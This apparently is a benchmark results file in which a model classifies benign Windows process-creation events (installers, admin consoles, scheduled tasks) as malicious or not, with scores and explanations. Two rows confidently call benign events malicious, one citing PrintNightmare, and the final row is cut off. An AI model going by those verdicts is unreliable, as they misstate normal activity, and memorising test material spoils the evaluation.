+claude-opus-4-8,BENIGN-ID1-regsvr32-s.csv,,,processed,YES,100.0,87.5,YES,1,"regsvr32.exe, spoolsv.exe",NT AUTHORITY\SYSTEM,"C:\Windows\system32\regsvr32.exe /s ""C:\Windows\system32\spool\drivers\x64\3\PrintConfig.dll""",,,0.0,5.41,5.2,2.0,4.0,4,15.2,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: regsvr32.exe, spoolsv.exe
+- Accounts: NT AUTHORITY\SYSTEM
+- Commands: C:\Windows\system32\regsvr32.exe /s ""C:\Windows\system32\spool\drivers\x64\3\PrintConfig.dll""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The print spooler service (spoolsv.exe) spawning regsvr32.exe to register PrintConfig.dll from the spool drivers directory is a known indicator of PrintNightmare (CVE-2021-34527) exploitation, where a malicious DLL is loaded via the Print Spooler. This activity runs as SYSTEM with a suspicious parent-child relationship that does not match legitimate printer driver installation patterns. The use of regsvr32 /s to silently load a DLL placed in the spooler driver path strongly suggests privilege escalation/RCE abuse."
+claude-opus-4-8,BENIGN-ID1-rundll32-c-windows-system32-shell32-dll-shcreatelocalserv.csv,,,processed,NO,100.0,100.0,YES,1,"rundll32.exe, svchost.exe","SIGMA\Administrator, NT AUTHORITY\SYSTEM","C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding",,,0.0,5.53,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: rundll32.exe, svchost.exe
+- Accounts: SIGMA\Administrator, NT AUTHORITY\SYSTEM
+- Commands: C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This is a legitimate Windows COM/DCOM activation, where svchost.exe (DcomLaunch) spawns rundll32.exe to invoke shell32.dll's SHCreateLocalServerRunDll with a CLSID and the -Embedding flag. The image is the signed Microsoft rundll32.exe running from System32 with a valid file version and original filename, consistent with normal COM local server startup. There are no suspicious DLLs, network connections, or anomalous command-line arguments indicating attack behavior."
+claude-opus-4-8,BENIGN-ID1-mmc-c-windows-system32-compmgmt-msc.csv,,,processed,NO,100.0,100.0,YES,1,"mmc.exe, ServerManager.exe",SIGMA\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\compmgmt.msc"" /s",,,0.0,5.63,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: mmc.exe, ServerManager.exe
+- Accounts: SIGMA\Administrator
+- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\compmgmt.msc"" /s
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows mmc.exe launching the Computer Management snap-in (compmgmt.msc) spawned from ServerManager.exe, both signed Microsoft binaries running from standard System32 paths. This is routine administrative activity consistent with an administrator managing a Windows server. No suspicious commands, network indicators, or anomalous parent-child relationships are present."
+claude-opus-4-8,BENIGN-ID1-mmc-c-windows-system32-dsa-msc.csv,,,processed,NO,100.0,100.0,YES,1,"mmc.exe, ServerManager.exe",SIGMA\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\dsa.msc"", ""C:\Windows\system32\ServerManager.exe""",,,0.0,3.45,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: mmc.exe, ServerManager.exe
+- Accounts: SIGMA\Administrator
+- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\dsa.msc"", ""C:\Windows\system32\ServerManager.exe""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows mmc.exe launching dsa.msc (Active Directory Users and Computers) from ServerManager.exe, which is normal administrative behavior for managing a domain controller. The signed Microsoft binaries, legitimate parent-child relationship, and standard administrator context all indicate routine system administration rather than malicious activity."
+claude-opus-4-8,BENIGN-ID1-mmc-c-windows-system32-gpmc-msc.csv,,,processed,NO,100.0,100.0,YES,1,"mmc.exe, ServerManager.exe",SIGMA\Administrator,"""C:\Windows\system32\mmc.exe"" C:\Windows\system32\gpmc.msc, ""C:\Windows\system32\ServerManager.exe""",,,0.0,3.92,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: mmc.exe, ServerManager.exe
+- Accounts: SIGMA\Administrator
+- Commands: ""C:\Windows\system32\mmc.exe"" C:\Windows\system32\gpmc.msc, ""C:\Windows\system32\ServerManager.exe""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows an administrator launching the Group Policy Management Console (gpmc.msc) via mmc.exe, spawned from ServerManager.exe, which is routine administrative behavior on a Windows server. All binaries are signed Microsoft executables running from legitimate System32 paths, and the activity matches normal management workflow performed by an admin account."
+claude-opus-4-8,BENIGN-ID1-mmc-c-windows-system32-gpme-msc.csv,,,processed,NO,100.0,100.0,YES,1,mmc.exe,SIGMA\Administrator,"""C:\Windows\system32\mmc.exe"" ""C:\Windows\System32\gpme.msc"" /s /gpobject:""LDAP://WIN-FPV0DSIC9O6.sigma.fr/cn={31B2F340-016D-11D2-945F-00C04FB984F9},cn=policies,cn=system,DC=sigma,DC=fr"", ""C:\Windows\system32\mmc.exe"" C:\Windows\system32\gpmc.msc",WIN-FPV0DSIC9O6.sigma.fr,,0.0,5.47,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: mmc.exe
+- Accounts: SIGMA\Administrator
+- Commands: ""C:\Windows\system32\mmc.exe"" ""C:\Windows\System32\gpme.msc"" /s /gpobject:""LDAP://WIN-FPV0DSIC9O6.sigma.fr/cn={31B2F340-016D-11D2-945F-00C04FB984F9},cn=policies,cn=system,DC=sigma,DC=fr"", ""C:\Windows\system32\mmc.exe"" C:\Windows\system32\gpmc.msc
+- Network: WIN-FPV0DSIC9O6.sigma.fr
+- Registry: None
+
+EXPLANATION:
+This event shows an administrator opening the Group Policy Management Editor (gpme.msc) from the Group Policy Management Console (gpmc.msc) via the signed Microsoft mmc.exe binary. The parent-child relationship between the two mmc.exe instances and editing the Default Domain Policy GUID ({31B2F340-016D-11D2-945F-00C04FB984F9}) is normal domain administration behavior. There are no indicators of malicious activity such as unsigned binaries, suspicious commands, or anomalous network connections."
+claude-opus-4-8,BENIGN-ID1-rundll32-d.csv,,,processed,NO,100.0,100.0,YES,1,"rundll32.exe, svchost.exe",NT AUTHORITY\SYSTEM,"C:\Windows\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations, C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule",,,0.0,4.35,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: rundll32.exe, svchost.exe
+- Accounts: NT AUTHORITY\SYSTEM
+- Commands: C:\Windows\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations, C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This is routine scheduled task activity where svchost.exe (Task Scheduler service) launches rundll32.exe to perform autochk operations via the legitimate acproxy.dll. The image is the signed Microsoft rundll32.exe running from System32 with a standard maintenance command line, consistent with normal Windows housekeeping behavior."
+claude-opus-4-8,BENIGN-ID1-gpupdate-force.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\gpupdate.exe, C:\Windows\System32\cmd.exe",SIGMA\Administrator,"gpupdate  /force, ""C:\Windows\system32\cmd.exe""",,,0.0,3.68,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\gpupdate.exe, C:\Windows\System32\cmd.exe
+- Accounts: SIGMA\Administrator
+- Commands: gpupdate  /force, ""C:\Windows\system32\cmd.exe""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows the legitimate signed Microsoft Group Policy Update Utility (gpupdate.exe) being run with the standard ""/force"" parameter from a command prompt by an administrator. This is routine administrative activity used to refresh group policy settings, with no suspicious commands, network connections, or anomalous parent-child relationships."
+claude-opus-4-8,BENIGN-ID1-regsvr32-c-program.csv,,,processed,NO,100.0,87.5,YES,1,"C:\Windows\System32\regsvr32.exe, C:\Windows\SysWOW64\regsvr32.exe",DESKTOP-A8CALR3\user,"/s ""C:\Program Files\Notepad++\NppShell_06.dll"", regsvr32 /s ""C:\Program Files\Notepad++\NppShell_06.dll""",,,16.7,5.22,5.2,5.0,3.3,2,15.5,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\regsvr32.exe, C:\Windows\SysWOW64\regsvr32.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands:  /s ""C:\Program Files (x86)\Notepad++\NppShell_06.dll"", regsvr32 /s ""C:\Program Files (x86)\Notepad++\NppShell_06.dll""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows regsvr32.exe registering a legitimate Notepad++ shell extension DLL (NppShell_06.dll) from the standard installation directory, which is normal behavior during Notepad++ installation. The DLL path, signed Microsoft regsvr32 binary, and lack of network or suspicious payload indicate routine software installation rather than the malicious remote/scriptlet abuse pattern (e.g., loading a remote .sct file) associated with regsvr32 attacks."
+claude-opus-4-8,BENIGN-ID1-schtasks-create.csv,,,processed,YES,100.0,100.0,YES,1,"schtasks.exe, target.tmp, target.exe",DESKTOP-A8CALR3\user,"""C:\Windows\system32\schtasks.exe"" /Create /TN ""klcp_update"" /XML ""C:\Users\user\AppData\Local\Temp\is-LSRFQ.tmp\klcp_update_task.xml"" /F, ""C:\Users\user\AppData\Local\Temp\is-GLVF6.tmp\target.tmp"" /SL5=""$1006E0,49873775,402432,C:\Users\user\AppData\Local\Temp\75D097~2\target.exe"" /verysilent /norestart /LoadInf=""C:\Users\user\AppData\Local\Temp\75D097~2\klcp_full_unattended.ini""",,,0.0,5.84,6.0,1.0,4.0,3,14.0,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: schtasks.exe, target.tmp, target.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: ""C:\Windows\system32\schtasks.exe"" /Create /TN ""klcp_update"" /XML ""C:\Users\user\AppData\Local\Temp\is-LSRFQ.tmp\klcp_update_task.xml"" /F, ""C:\Users\user\AppData\Local\Temp\is-GLVF6.tmp\target.tmp"" /SL5=""$1006E0,49873775,402432,C:\Users\user\AppData\Local\Temp\75D097~2\target.exe"" /verysilent /norestart /LoadInf=""C:\Users\user\AppData\Local\Temp\75D097~2\klcp_full_unattended.ini""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+A temporary executable (target.tmp) running from a user AppData\Local\Temp directory spawned schtasks.exe to create a scheduled task for persistence using an XML file in another Temp folder, with /F to force overwrite. The use of /verysilent /norestart silent-install flags combined with High integrity execution and a scheduled-task persistence mechanism from temp directories is consistent with malware/dropper behavior rather than legitimate software installation."
+claude-opus-4-8,BENIGN-ID1-netsh-advfirewall.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\SysWOW64\netsh.exe, C:\Program Files\Dropbox\Client_141.4.3299\Dropbox.exe",DESKTOP-A8CALR3\user,"C:\Windows\system32\netsh.exe advfirewall firewall delete rule name=Dropbox, ""C:\Program Files\Dropbox\Client\..\Client_141.4.3299\Dropbox.exe"" /install /InstallType:MACHINE /InstallDir:""C:\Program Files\Dropbox\Client"" /KillEveryone:YES /DBData:",,,0.0,5.11,6.0,5.0,4.0,1,16.0,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\SysWOW64\netsh.exe, C:\Program Files (x86)\Dropbox\Client_141.4.3299\Dropbox.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: C:\Windows\system32\netsh.exe advfirewall firewall delete rule name=Dropbox, ""C:\Program Files (x86)\Dropbox\Client\..\Client_141.4.3299\Dropbox.exe"" /install /InstallType:MACHINE /InstallDir:""C:\Program Files (x86)\Dropbox\Client"" /KillEveryone:YES /DBData:
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The netsh firewall rule deletion is launched by the legitimate, signed Dropbox.exe installer during a machine installation, and the rule name ""Dropbox"" is specific to the application's own cleanup process. While netsh firewall modification can be an attacker technique, the parent-child relationship, valid Microsoft-signed netsh binary, and benign install context indicate this is routine Dropbox installer behavior rather than malicious activity."
+claude-opus-4-8,BENIGN-ID1-regsvr32-n.csv,,,processed,NO,100.0,87.5,YES,1,"C:\Windows\System32\regsvr32.exe, C:\Windows\SysWOW64\regsvr32.exe",DESKTOP-A8CALR3\user,"/S /n /i:\""hklm_reg\"" ""C:\Program Files\Dropbox\Client\DropboxExt64.52.0.dll"", C:\Windows\SysWOW64\regsvr32.exe /S /n /i:\""hklm_reg\"" ""C:\Program Files\Dropbox\Client\DropboxExt64.52.0.dll""",,hklm_reg,16.7,6.87,5.2,6.0,3.3,2,16.5,B,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\regsvr32.exe, C:\Windows\SysWOW64\regsvr32.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands:  /S /n /i:\""hklm_reg\"" ""C:\Program Files (x86)\Dropbox\Client\DropboxExt64.52.0.dll"", C:\Windows\SysWOW64\regsvr32.exe /S /n /i:\""hklm_reg\"" ""C:\Program Files (x86)\Dropbox\Client\DropboxExt64.52.0.dll""
+- Network: None
+- Registry: hklm_reg
+
+EXPLANATION:
+The regsvr32.exe execution registers a legitimate signed Dropbox shell extension DLL (DropboxExt64.52.0.dll) from the standard Dropbox install directory, which is expected behavior during Dropbox installation/update. While regsvr32 with /i can be abused for proxy execution, here it loads a local trusted vendor DLL with no remote scriptlet or network reference, indicating routine benign activity."
+claude-opus-4-8,BENIGN-ID1-sc-delete.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\sc.exe, C:\Program Files\Dropbox\Client_141.4.3299\Dropbox.exe",DESKTOP-A8CALR3\user,"C:\Windows\System32\sc.exe delete DbxSvc, ""C:\Program Files\Dropbox\Client\..\Client_141.4.3299\Dropbox.exe"" /install /InstallType:MACHINE /InstallDir:""C:\Program Files\Dropbox\Client"" /KillEveryone:YES /DBData:",,,0.0,4.74,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\sc.exe, C:\Program Files (x86)\Dropbox\Client_141.4.3299\Dropbox.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: C:\Windows\System32\sc.exe delete DbxSvc, ""C:\Program Files (x86)\Dropbox\Client\..\Client_141.4.3299\Dropbox.exe"" /install /InstallType:MACHINE /InstallDir:""C:\Program Files (x86)\Dropbox\Client"" /KillEveryone:YES /DBData:
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The sc.exe process deleting the DbxSvc service was spawned by the legitimate, signed Dropbox.exe installer running with an /install command line from the standard Dropbox program directory. This service deletion is a normal part of a Dropbox installation/upgrade workflow rather than malicious service tampering."
+claude-opus-4-8,BENIGN-ID1-sc-create.csv,,,processed,NO,100.0,87.5,YES,1,"C:\Windows\System32\sc.exe, C:\Program Files\Dropbox\Client_141.4.3299\Dropbox.exe",DESKTOP-A8CALR3\user,C:\Windows\System32\sc.exe create DbxSvc binPath=C:\Windows\System32\DbxSvc.exe start=auto,,,0.0,4.41,5.2,6.0,4.0,3,18.2,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\sc.exe, C:\Program Files (x86)\Dropbox\Client_141.4.3299\Dropbox.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: C:\Windows\System32\sc.exe create DbxSvc binPath=C:\Windows\System32\DbxSvc.exe start=auto
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The sc.exe process creating the DbxSvc service was spawned by the legitimate, signed Dropbox installer (Dropbox.exe) running its /install routine. The DbxSvc service and its binary path are standard components of a normal Dropbox client installation, making this routine software setup activity rather than malicious service creation."
+claude-opus-4-8,BENIGN-ID1-sc-failure.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\SysWOW64\sc.exe, C:\Program Files\Dropbox\Client_141.4.3299\Dropbox.exe",DESKTOP-A8CALR3\user,"C:\Windows\System32\sc.exe failure DbxSvc reset= 3600 actions= restart/5000/restart/30000//, ""C:\Program Files\Dropbox\Client\..\Client_141.4.3299\Dropbox.exe"" /install /InstallType:MACHINE /InstallDir:""C:\Program Files\Dropbox\Client"" /KillEveryone:YES /DBData:",,,0.0,5.31,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\SysWOW64\sc.exe, C:\Program Files (x86)\Dropbox\Client_141.4.3299\Dropbox.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: C:\Windows\System32\sc.exe failure DbxSvc reset= 3600 actions= restart/5000/restart/30000//, ""C:\Program Files (x86)\Dropbox\Client\..\Client_141.4.3299\Dropbox.exe"" /install /InstallType:MACHINE /InstallDir:""C:\Program Files (x86)\Dropbox\Client"" /KillEveryone:YES /DBData:
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows the legitimate, Microsoft-signed sc.exe being spawned by the signed Dropbox.exe installer to configure failure recovery actions for the DbxSvc service during a normal MACHINE installation. The parent process, working directory, and command-line are all consistent with routine Dropbox software installation behavior, so this is benign activity."
+claude-opus-4-8,BENIGN-ID1-powershell-get-appxpackage.csv,,,processed,NO,100.0,100.0,YES,1,"powershell.exe, Dropbox.exe",DESKTOP-A8CALR3\user,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell ""Get-AppxPackage C27EB4BA.DropboxOEM | Remove-AppxPackage"", ""C:\Program Files\Dropbox\Client\..\Client_141.4.3299\Dropbox.exe"" /install /InstallType:MACHINE /InstallDir:""C:\Program Files\Dropbox\Client"" /KillEveryone:YES /DBData:",,,0.0,5.92,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: powershell.exe, Dropbox.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: C:\Windows\System32\WindowsPowerShell\v1.0\powershell ""Get-AppxPackage C27EB4BA.DropboxOEM | Remove-AppxPackage"", ""C:\Program Files (x86)\Dropbox\Client\..\Client_141.4.3299\Dropbox.exe"" /install /InstallType:MACHINE /InstallDir:""C:\Program Files (x86)\Dropbox\Client"" /KillEveryone:YES /DBData:
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows the legitimate, signed Dropbox.exe installer launching PowerShell to remove the bundled DropboxOEM AppxPackage, which is normal behavior during a Dropbox installation/upgrade. The process is Microsoft-signed PowerShell run from a standard path with a benign, well-formed command and a legitimate parent process. There are no obfuscated commands, suspicious network connections, or privilege-escalation indicators present."
+claude-opus-4-8,BENIGN-ID1-powershell-get-appxprovisionedpackage.csv,,,processed,NO,100.0,87.5,YES,1,"powershell.exe, Dropbox.exe",DESKTOP-A8CALR3\user,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell ""Get-AppxProvisionedPackage -Online | Where-Object DisplayName -In \""C27EB4BA.DropboxOEM\"" | Remove-ProvisionedAppxPackage -Online""",,,0.0,5.34,5.2,6.0,4.0,4,19.2,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: powershell.exe, Dropbox.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: C:\Windows\System32\WindowsPowerShell\v1.0\powershell ""Get-AppxProvisionedPackage -Online | Where-Object DisplayName -In \""C27EB4BA.DropboxOEM\"" | Remove-ProvisionedAppxPackage -Online""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows the legitimate, signed Dropbox.exe installer spawning PowerShell to remove the provisioned DropboxOEM AppX package as part of a normal application installation routine. The parent process is the Dropbox client installer running from its standard Program Files path, and the command performs expected package cleanup with no obfuscation, encoding, or suspicious network activity. This is routine, benign installer behavior."
+claude-opus-4-8,BENIGN-ID1-sc-start.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\sc.exe, C:\Windows\System32\svchost.exe","NT AUTHORITY\LOCAL SERVICE, NT AUTHORITY\SYSTEM","C:\Windows\system32\sc.exe start w32time task_started, C:\Windows\system32\svchost.exe -k netsvcs -p",,,0.0,4.00,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\sc.exe, C:\Windows\System32\svchost.exe
+- Accounts: NT AUTHORITY\LOCAL SERVICE, NT AUTHORITY\SYSTEM
+- Commands: C:\Windows\system32\sc.exe start w32time task_started, C:\Windows\system32\svchost.exe -k netsvcs -p
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows the legitimate signed Service Control Manager tool (sc.exe) starting the Windows Time service (w32time), spawned by svchost.exe running netsvcs as part of normal OS scheduled task behavior. The process is Microsoft-signed, runs from the standard System32 path, and the command is consistent with routine system maintenance, indicating benign activity."
+claude-opus-4-8,BENIGN-ID1-rundll32-c-windows-system32-windows-staterepositoryclient.csv,,,processed,NO,100.0,87.5,YES,1,"rundll32.exe, svchost.exe",NT AUTHORITY\SYSTEM,"C:\Windows\system32\rundll32.exe C:\Windows\system32\Windows.StateRepositoryClient.dll,StateRepositoryDoMaintenanceTasks",,,0.0,4.33,5.2,6.0,4.0,3,18.2,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: rundll32.exe, svchost.exe
+- Accounts: NT AUTHORITY\SYSTEM
+- Commands: C:\Windows\system32\rundll32.exe C:\Windows\system32\Windows.StateRepositoryClient.dll,StateRepositoryDoMaintenanceTasks
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows rundll32.exe executing a signed Microsoft system DLL (Windows.StateRepositoryClient.dll) to perform routine StateRepository maintenance tasks, launched by the legitimate svchost.exe netsvcs service host. Both the parent and child processes reside in System32 with valid Microsoft file versions and run under SYSTEM as expected for scheduled OS maintenance, indicating normal Windows background activity."
+claude-opus-4-8,BENIGN-ID1-powershell-noprofile.csv,,,processed,NO,100.0,87.5,YES,1,"powershell.exe, Setup32.exe",DESKTOP-A8CALR3\user,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -NonInteractive -WindowStyle Hidden -Command ""& { $isOfficeInstalled = Get-AppxPackage Microsoft.Office.Desktop -allusers | if ($isOfficeInstalled -eq $null) { Out-File -FilePath 'C:\Users\user\AppData\Local\Temp\Centennial.Detection.IsCentennialOfficeInstalled.scratch' -InputObject '0' -Encoding ascii | } else { Out-File -FilePath 'C:\Users\user\AppData\Local\Temp\Centennial.Detection.IsCentennialOfficeInstalled.scratch' -InputObject '1' -Encoding ascii } }""",,,0.0,5.98,5.2,6.0,4.0,3,18.2,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: powershell.exe, Setup32.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -NonInteractive -WindowStyle Hidden -Command ""& { $isOfficeInstalled = Get-AppxPackage Microsoft.Office.Desktop -allusers; if ($isOfficeInstalled -eq $null) { Out-File -FilePath 'C:\Users\user\AppData\Local\Temp\Centennial.Detection.IsCentennialOfficeInstalled.scratch' -InputObject '0' -Encoding ascii; } else { Out-File -FilePath 'C:\Users\user\AppData\Local\Temp\Centennial.Detection.IsCentennialOfficeInstalled.scratch' -InputObject '1' -Encoding ascii } }""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This is a legitimate Microsoft Office installer (Setup32.exe) launching a signed PowerShell process to detect whether Office is already installed via Get-AppxPackage, writing a simple 0/1 flag to a temp scratch file. Although it uses -WindowStyle Hidden, the command performs only a benign detection check with no encoded payloads, downloads, or network activity, consistent with routine Office setup behavior."
+claude-opus-4-8,BENIGN-ID1-schtasks-delete.csv,,,processed,NO,100.0,100.0,YES,1,"schtasks.exe, Integrator.exe",NT AUTHORITY\SYSTEM,"schtasks.exe /Delete /F /tn ""Microsoft\Office\OfficeBackgroundTaskHandlerLogon"", integrator.exe /U /Extension /Msi /License PRIDName= PackageGUID=""9AC08E99-230B-47e8-9721-4577B7F124EA"" PackageRoot=""C:\Program Files\Microsoft Office\root""",,,0.0,5.18,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: schtasks.exe, Integrator.exe
+- Accounts: NT AUTHORITY\SYSTEM
+- Commands: schtasks.exe /Delete /F /tn ""Microsoft\Office\OfficeBackgroundTaskHandlerLogon"", integrator.exe /U /Extension /Msi /License PRIDName= PackageGUID=""9AC08E99-230B-47e8-9721-4577B7F124EA"" PackageRoot=""C:\Program Files (x86)\Microsoft Office\root""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The schtasks.exe deletion of the OfficeBackgroundTaskHandlerLogon task was spawned by the legitimate, signed Microsoft Office Integrator.exe during an extension/MSI integration operation. This is routine Office installation/configuration behavior, and all binaries are signed Microsoft Operating System components running under expected SYSTEM context. There is no evidence of malicious chaining, persistence creation, or suspicious network activity."
+claude-opus-4-8,BENIGN-ID1-wevtutil-im.csv,,,processed,NO,100.0,87.5,YES,1,"wevtutil.exe, Integrator.exe",NT AUTHORITY\SYSTEM,"wevtutil.exe im ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\wordEtw.man"" /rf:""C:\Program Files\Microsoft Office\root\Office16\wwlib.dll"" /mf:""C:\Program Files\Microsoft Office\root\Office16\wwlib.dll""",,,0.0,5.78,5.2,6.0,4.0,3,18.2,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: wevtutil.exe, Integrator.exe
+- Accounts: NT AUTHORITY\SYSTEM
+- Commands: wevtutil.exe im ""C:\ProgramData\Microsoft\ClickToRun\{9AC08E99-230B-47e8-9721-4577B7F124EA}\wordEtw.man"" /rf:""C:\Program Files (x86)\Microsoft Office\root\Office16\wwlib.dll"" /mf:""C:\Program Files (x86)\Microsoft Office\root\Office16\wwlib.dll""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows wevtutil.exe installing (im) an ETW event manifest for Microsoft Word, spawned by Integrator.exe during a Microsoft Office ClickToRun integration process. The use of wevtutil ""im"" to install a manifest (rather than ""cl"" to clear logs) is a legitimate Office setup/registration activity by a signed Microsoft binary. The parent-child chain and file paths are consistent with normal Office installation, indicating benign behavior."
+claude-opus-4-8,BENIGN-ID1-schtasks-change.csv,,,processed,NO,100.0,87.5,YES,1,"schtasks.exe, OfficeClickToRun.exe",NT AUTHORITY\SYSTEM,"schtasks.exe /change /tn ""Microsoft\Office\Office ClickToRun Service Monitor"" /enable",,,0.0,4.00,5.2,6.0,4.0,3,18.2,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: schtasks.exe, OfficeClickToRun.exe
+- Accounts: NT AUTHORITY\SYSTEM
+- Commands: schtasks.exe /change /tn ""Microsoft\Office\Office ClickToRun Service Monitor"" /enable
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows the legitimate, signed Microsoft OfficeClickToRun.exe service spawning schtasks.exe to enable a built-in Office ClickToRun maintenance task. The parent-child process relationship, file paths, vendor signatures, and command context are all consistent with normal Office update/servicing activity rather than malicious task manipulation."
+claude-opus-4-8,BENIGN-ID1-powershell-run.csv,,,processed,NO,100.0,100.0,YES,1,"powershell.exe, Code.exe",DESKTOP-A8CALR3\user,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, ""C:\Program Files\Microsoft VS Code\Code.exe"" --ms-enable-electron-run-as-node ""c:\Program Files\Microsoft VS Code\resources\app\out\bootstrap-fork"" --type=ptyHost",,,0.0,4.83,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: powershell.exe, Code.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, ""C:\Program Files\Microsoft VS Code\Code.exe"" --ms-enable-electron-run-as-node ""c:\Program Files\Microsoft VS Code\resources\app\out\bootstrap-fork"" --type=ptyHost
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows PowerShell launched from Visual Studio Code's integrated terminal (Code.exe with ptyHost), which is normal developer behavior. The PowerShell process runs with no suspicious arguments, at Medium integrity, signed by Microsoft, and under a standard user context with no encoded commands or network activity. There is no indication of malicious intent based on this single benign process creation."
+claude-opus-4-8,BENIGN-ID1-whoami-run.csv,,,processed,NO,100.0,100.0,YES,1,"C:\Windows\System32\whoami.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",DESKTOP-A8CALR3\user,"""C:\Windows\system32\whoami.exe"", C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,0.0,4.19,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: NO
+
+EVIDENCE:
+- Event IDs: 1
+- Processes: C:\Windows\System32\whoami.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+- Accounts: DESKTOP-A8CALR3\user
+- Commands: ""C:\Windows\system32\whoami.exe"", C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+- Network: None
+- Registry: None
+
+EXPLANATION:
